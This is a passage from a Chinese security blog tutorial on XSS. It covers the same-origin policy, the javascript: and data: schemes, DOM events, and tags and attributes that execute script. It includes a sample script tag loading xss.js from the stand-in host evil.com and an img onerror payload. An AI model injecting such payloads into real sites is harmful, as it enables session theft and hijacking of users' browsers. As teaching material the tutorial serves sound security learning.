<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="一篇文章深入学习XSS漏洞"><meta name="keywords" content="XSS"><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><title>一篇文章深入学习XSS漏洞 | M0nk3y's Blog @ D0g3</title><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201228205809.JPG"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.1.1'
} </script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="M0nk3y's Blog @ D0g3" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00  前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">0x01  基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaScript%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.1.</span> <span class="toc-text">JavaScript伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data-%E5%8D%8F%E8%AE%AE-Data-URI-Scheme"><span class="toc-number">2.2.</span> <span class="toc-text">data:协议(Data URI Scheme)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B-DOM"><span class="toc-number">2.3.</span> <span class="toc-text">文档对象模型(DOM)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E7%9B%B8%E5%85%B3%E7%9A%84HTML%E7%9F%A5%E8%AF%86"><span class="toc-number">2.4.</span> <span class="toc-text">一些相关的HTML知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%80%E6%9C%89%E7%9A%84Event%E9%83%BD%E6%98%AF%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8CJS"><span class="toc-number">2.5.</span> <span class="toc-text">所有的Event都是可以执行JS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8CJS%E7%9A%84%E6%A0%87%E7%AD%BE"><span class="toc-number">2.6.</span> <span class="toc-text">可以执行JS的标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8CJS%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="toc-number">2.7.</span> <span class="toc-text">可以执行JS的属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML%E4%B8%8Ejavascript%E8%87%AA%E8%A7%A3%E7%A0%81%E6%9C%BA%E5%88%B6"><span class="toc-number">2.8.</span> <span class="toc-text">HTML与javascript自解码机制</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E4%BB%80%E4%B9%88%E6%98%AFXSS"><span class="toc-number">3.</span> <span class="toc-text">0x02  什么是XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%AE%80%E4%BB%8B"><span class="toc-number">3.1.</span> <span class="toc-text">XSS简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E5%88%86%E7%B1%BB"><span class="toc-number">3.2.</span> <span class="toc-text">XSS分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">3.2.1.</span> <span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">3.2.2.</span> <span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-number">3.2.3.</span> <span class="toc-text">DOM型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flash-XSS"><span class="toc-number">3.2.4.</span> <span class="toc-text">Flash XSS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-XSS%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">0x03 XSS利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookies-%E7%AA%83%E5%8F%96"><span class="toc-number">4.1.</span> <span class="toc-text">Cookies 窃取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81"><span class="toc-number">4.2.</span> <span class="toc-text">会话劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%93%E9%B1%BC"><span class="toc-number">4.3.</span> <span class="toc-text">钓鱼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%8C%82%E9%A9%AC"><span class="toc-number">4.4.</span> <span class="toc-text">网页挂马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%86%E5%88%AB%E7%94%A8%E6%88%B7%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-number">4.5.</span> <span class="toc-text">识别用户浏览器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOS-%E4%B8%8E-DDOS"><span class="toc-number">4.6.</span> <span class="toc-text">DOS 与 DDOS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E8%A0%95%E8%99%AB"><span class="toc-number">4.7.</span> <span class="toc-text">XSS 蠕虫</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Self-XSS"><span class="toc-number">4.8.</span> <span class="toc-text">Self-XSS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-XSS%E9%98%B2%E5%BE%A1"><span class="toc-number">5.</span> <span class="toc-text">0x04 XSS防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-XSS%E6%A3%80%E6%B5%8B"><span class="toc-number">6.</span> <span class="toc-text">0x05 XSS检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-XSS%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">0x06 XSS绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">7.1.</span> <span class="toc-text">初步测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%85%B6%E4%BB%96%E6%A0%87%E7%AD%BE"><span class="toc-number">7.2.</span> <span class="toc-text">测试其他标签</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#src%E5%B1%9E%E6%80%A7"><span class="toc-number">7.2.1.</span> <span class="toc-text">src属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iframe%E6%A0%87%E7%AD%BE"><span class="toc-number">7.2.2.</span> <span class="toc-text">iframe标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#embed%E6%A0%87%E7%AD%BE"><span class="toc-number">7.2.3.</span> <span class="toc-text">embed标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#action%E5%B1%9E%E6%80%A7"><span class="toc-number">7.2.4.</span> <span class="toc-text">action属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#formaction%E5%B1%9E%E6%80%A7"><span class="toc-number">7.2.5.</span> <span class="toc-text">formaction属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#background%E5%B1%9E%E6%80%A7"><span class="toc-number">7.2.6.</span> <span class="toc-text">background属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poster%E5%B1%9E%E6%80%A7"><span class="toc-number">7.2.7.</span> <span class="toc-text">poster属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data%E5%B1%9E%E6%80%A7"><span class="toc-number">7.2.8.</span> <span class="toc-text">data属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#code%E5%B1%9E%E6%80%A7"><span class="toc-number">7.2.9.</span> <span class="toc-text">code属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E8%A7%A6%E5%8F%91"><span class="toc-number">7.2.10.</span> <span class="toc-text">事件触发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%9F%AD%E7%9A%84%E6%B5%8B%E8%AF%95%E5%90%91%E9%87%8F"><span class="toc-number">7.2.11.</span> <span class="toc-text">最短的测试向量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B5%8C%E5%A5%97"><span class="toc-number">7.2.12.</span> <span class="toc-text">嵌套</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%8B%AC%E5%8F%B7%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B"><span class="toc-number">7.2.13.</span> <span class="toc-text">过滤括号的情况下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#expression%E5%B1%9E%E6%80%A7"><span class="toc-number">7.2.14.</span> <span class="toc-text">expression属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#location%E5%B1%9E%E6%80%A7"><span class="toc-number">7.2.15.</span> <span class="toc-text">location属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%9A%84%E4%B8%80%E4%BA%9Bpayload"><span class="toc-number">7.2.16.</span> <span class="toc-text">其他的一些payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%93-%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%97%B6"><span class="toc-number">7.2.17.</span> <span class="toc-text">当&#x3D; ( ) ; :被过滤时</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-number">7.3.</span> <span class="toc-text">绕过长度限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E8%BF%87%E6%BB%A4%E5%B9%B6%E4%B8%8D%E6%99%BA%E8%83%BD"><span class="toc-number">7.4.</span> <span class="toc-text">XSS过滤并不智能</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8Bug"><span class="toc-number">7.5.</span> <span class="toc-text">浏览器Bug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87CSP"><span class="toc-number">7.6.</span> <span class="toc-text">绕过CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSP%E4%BB%8B%E7%BB%8D"><span class="toc-number">7.6.1.</span> <span class="toc-text">CSP介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%B8%B8%E7%94%A8%E7%9A%84%E7%AD%96%E7%95%A5%E6%8C%87%E4%BB%A4%EF%BC%9A"><span class="toc-number">7.6.1.1.</span> <span class="toc-text">一、常用的策略指令：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#default-src"><span class="toc-number">7.6.1.1.1.</span> <span class="toc-text">default-src</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#script-src"><span class="toc-number">7.6.1.1.2.</span> <span class="toc-text">script-src</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#style-src"><span class="toc-number">7.6.1.1.3.</span> <span class="toc-text">style-src</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#img-src"><span class="toc-number">7.6.1.1.4.</span> <span class="toc-text">img-src</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#font-src"><span class="toc-number">7.6.1.1.5.</span> <span class="toc-text">font-src</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#connect-src"><span class="toc-number">7.6.1.1.6.</span> <span class="toc-text">connect-src</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#child-src"><span class="toc-number">7.6.1.1.7.</span> <span class="toc-text">child-src</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%86%85%E5%AE%B9%E6%BA%90%EF%BC%9A"><span class="toc-number">7.6.1.2.</span> <span class="toc-text">二、内容源：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BA%90%E5%88%97%E8%A1%A8"><span class="toc-number">7.6.1.2.1.</span> <span class="toc-text">源列表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">7.6.1.2.2.</span> <span class="toc-text">关键字</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE"><span class="toc-number">7.6.1.2.3.</span> <span class="toc-text">数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87CSP%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">7.6.2.</span> <span class="toc-text">绕过CSP的几种方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81url%E8%B7%B3%E8%BD%AC"><span class="toc-number">7.6.2.1.</span> <span class="toc-text">一、url跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81link%E6%A0%87%E7%AD%BE%E9%A2%84%E5%8A%A0%E8%BD%BD"><span class="toc-number">7.6.2.2.</span> <span class="toc-text">二、link标签预加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A1%A5%E5%85%A8"><span class="toc-number">7.6.2.3.</span> <span class="toc-text">三、利用浏览器补全</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8"><span class="toc-number">7.6.2.4.</span> <span class="toc-text">四、代码重用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%94%E3%80%81iframe"><span class="toc-number">7.6.2.5.</span> <span class="toc-text">五、iframe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AD%E3%80%81meta%E6%A0%87%E7%AD%BE"><span class="toc-number">7.6.2.6.</span> <span class="toc-text">六、meta标签</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87htmlspecialchars-%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81"><span class="toc-number">7.6.3.</span> <span class="toc-text">绕过htmlspecialchars()实体编码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-XSS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">8.</span> <span class="toc-text">0x07  XSS漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">8.1.</span> <span class="toc-text">1)反射型XSS漏洞挖掘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">8.2.</span> <span class="toc-text">2)存储型XSS漏洞挖掘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-DOM%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">8.3.</span> <span class="toc-text">3)DOM型XSS漏洞挖掘</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-XSS%E5%9C%A8CTF%E4%B8%AD%E5%BA%94%E7%94%A8"><span class="toc-number">9.</span> <span class="toc-text">0x08 XSS在CTF中应用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E6%80%BB%E7%BB%93"><span class="toc-number">10.</span> <span class="toc-text">0x09  总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x10-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">11.</span> <span class="toc-text">0x10  参考资料</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x11-%E6%9C%80%E5%90%8E"><span class="toc-number">12.</span> <span class="toc-text">0x11 最后</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201228205809.JPG"></div><div class="author-info__name text-center">m0nk3y</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">55</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">53</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">9</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.google.com">Google</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">M0nk3y's Blog @ D0g3</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a><a class="site-page" href="/link">Friends</a><a class="site-page" href="/mytalk">说说</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">一篇文章深入学习XSS漏洞</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-25</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/TOP10%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">TOP10基础漏洞</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">12.1k</span><span class="post-meta__separator">|</span><span>Reading time: 51 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h1><p>XSS漏洞可以追溯到1990年代,在2010年Web安全威胁前10位中,XSS排名第二,仅次于Injection</p>
<blockquote>
<p>本学习笔记,大量参考自网络上各位大佬总结好的,再加上自己的心得总结而成,用途仅用于安全技术学习.文末注明参考资料,侵删.</p>
</blockquote>
<a id="more"></a>

<h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01  基础知识"></a>0x01  基础知识</h1><p>基础知识的补充主要是JavaScript这部分的,弹窗不只是有alert还有prompt,confirm,当然弹窗只是用来测试XSS的,真正是XSS<strong>攻击</strong>,弹窗是毫无意义的,常常我们会加载第三方域的脚本资源,然后诱使目标用户点击链接</p>
<p>javascript能做的事,XSS payload都能做.举个简单的例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;wwww.evil.com&#x2F;xss.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>这段代码执行的是<code>www.evil.com</code>下的<code>xss.js</code>脚本.如果不是本域了,而浏览器并没有按照同源策略进行,那么可以叫做<strong>跨域脚本</strong></p>
<p>那么什么是<strong>同源策略</strong>?</p>
<p><strong>所谓同源是指，域名，协议，端口相同</strong>。</p>
<p>同源策略（Same origin policy）是一种约定，它是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%B5%8F%E8%A7%88%E5%99%A8/213911">浏览器</a>最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。(百度百科)</p>
<p>同源策略是浏览器的行为，是为了保护本地数据不被JavaScript代码获取回来的数据污染，因此拦截的是客户端发出的请求回来的数据接收，即请求发送了，服务器响应了，但是无法被浏览器接收。</p>
<p>在浏览器中,script img iframe link等标签都可以跨域加载资源,而不受同源策略的限制.</p>
<h2 id="JavaScript伪协议"><a href="#JavaScript伪协议" class="headerlink" title="JavaScript伪协议"></a>JavaScript伪协议</h2><p>javascript伪协议所有浏览器都支持,不过有些差异</p>
<p>伪协议是为关联应用程序而使用的，JavaScript伪协议实际上是把javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。</p>
<h2 id="data-协议-Data-URI-Scheme"><a href="#data-协议-Data-URI-Scheme" class="headerlink" title="data:协议(Data URI Scheme)"></a>data:协议(Data URI Scheme)</h2><p>data:协议仅IE浏览器不支持</p>
<p>data URI scheme 允许我们使用内联（inline-code）的方式在网页中包含数据，目的是将一些小的数据，直接嵌入到网页中，从而不用再从外部文件载入。常用于将图片嵌入网页。</p>
<p>Data URI Scheme支持的类型有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">data:,&lt;文本数据&gt; </span><br><span class="line"></span><br><span class="line"> data:text&#x2F;plain,&lt;文本数据&gt; </span><br><span class="line"></span><br><span class="line"> data:text&#x2F;html,&lt;HTML代码&gt; </span><br><span class="line"></span><br><span class="line"> data:text&#x2F;html;base64,&lt;base64编码的HTML代码&gt; </span><br><span class="line"></span><br><span class="line"> data:text&#x2F;css,&lt;CSS代码&gt; </span><br><span class="line"></span><br><span class="line"> data:text&#x2F;css;base64,&lt;base64编码的CSS代码&gt; </span><br><span class="line"></span><br><span class="line"> data:text&#x2F;javascript,&lt;Javascript代码&gt; </span><br><span class="line"></span><br><span class="line"> data:text&#x2F;javascript;base64,&lt;base64编码的Javascript代码&gt; </span><br><span class="line"></span><br><span class="line"> data:image&#x2F;gif;base64,base64编码的gif图片数据 </span><br><span class="line"></span><br><span class="line"> data:image&#x2F;png;base64,base64编码的png图片数据 </span><br><span class="line"></span><br><span class="line"> data:image&#x2F;jpeg;base64,base64编码的jpeg图片数据 </span><br><span class="line"></span><br><span class="line"> data:image&#x2F;x-icon;base64,base64编码的icon图片数据</span><br></pre></td></tr></table></figure>



<h2 id="文档对象模型-DOM"><a href="#文档对象模型-DOM" class="headerlink" title="文档对象模型(DOM)"></a>文档对象模型(DOM)</h2><p>DOM,是一种与平台和语言无关的应用程序接口(API).将 web 页面与到脚本或编程语言连接起来。通常是指 JavaScript，但将 HTML、SVG 或 XML 文档建模为对象并不是 JavaScript 语言的一部分。DOM模型用一个逻辑树来表示一个文档，树的每个分支的终点都是一个节点(node)，每个节点都包含着对象(objects)。DOM的方法(methods)让你可以用特定方式操作这个树，用这些方法你可以改变文档的结构、样式或者内容。节点可以关联上事件处理器，一旦某一事件被触发了，那些事件处理器就会被执行。</p>
<h2 id="一些相关的HTML知识"><a href="#一些相关的HTML知识" class="headerlink" title="一些相关的HTML知识"></a>一些相关的HTML知识</h2><p><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/dom-obj-event.html">更多的在这里学习,复习 HTML DOM 事件</a> ,下面只列举一些比较常见的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">onclick,用户点击某个对象时调用的事件句柄</span><br><span class="line"></span><br><span class="line">onerror,在加载文档或者图像时发生错误调用</span><br><span class="line"></span><br><span class="line">onload,一张页面或已付图像完成加载</span><br><span class="line"></span><br><span class="line">onunload,用户退出页面</span><br><span class="line"></span><br><span class="line">onblur 元素失去焦点触发</span><br><span class="line"></span><br><span class="line">onfocus 元素获取焦点时触发</span><br><span class="line"></span><br><span class="line">document.cookie 设置或返回与当前文档有关的所有cookie</span><br><span class="line"></span><br><span class="line">document.baseURI 返回文档的绝对基础URI</span><br><span class="line"></span><br><span class="line">document.getElementById()返回拥有指定id的第一个对象的引用</span><br><span class="line"></span><br><span class="line">document.write()向文档写HTML表达式或JavaScript代码</span><br></pre></td></tr></table></figure>



<h2 id="所有的Event都是可以执行JS"><a href="#所有的Event都是可以执行JS" class="headerlink" title="所有的Event都是可以执行JS"></a>所有的Event都是可以执行JS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onload onunload onchange onsubmit onreset onselect onblur onfocus onabort onkeydown onkeypress onkeyup onclick ondbclick onmouseover onmousemove onmouseout onmouseup onforminput onformchange ondrag ondrop</span><br></pre></td></tr></table></figure>

<h2 id="可以执行JS的标签"><a href="#可以执行JS的标签" class="headerlink" title="可以执行JS的标签"></a>可以执行JS的标签</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; &lt;a&gt; &lt;p&gt; &lt;img&gt; &lt;body&gt; &lt;button&gt; &lt;var&gt; &lt;div&gt; &lt;iframe&gt; &lt;object&gt; &lt;input&gt; &lt;select&gt; &lt;textarea&gt; &lt;keygen&gt; &lt;frameset&gt; &lt;embed&gt; &lt;svg&gt; &lt;math&gt; &lt;video&gt; &lt;audio&gt;</span><br></pre></td></tr></table></figure>

<h2 id="可以执行JS的属性"><a href="#可以执行JS的属性" class="headerlink" title="可以执行JS的属性"></a>可以执行JS的属性</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">formaction action href xlink:href autofocus src content data</span><br></pre></td></tr></table></figure>

<h2 id="HTML与javascript自解码机制"><a href="#HTML与javascript自解码机制" class="headerlink" title="HTML与javascript自解码机制"></a>HTML与javascript自解码机制</h2><p>举个例子,用户输入在HTML中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;button&quot; id&#x3D;&quot;exec_btn&quot; value&#x3D;&quot;exec&quot; onclick&#x3D;&quot;document.write(&#39;&lt;img src&#x3D;@ onerror&#x3D;alert(123)&#x2F;&gt;&#39;)&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>假设document.write里的值是用户可控的输入,点击后,document.wirte出现一段img HTML,onerror里的JS会执行</p>
<p>来看一段HtmlEncode</p>
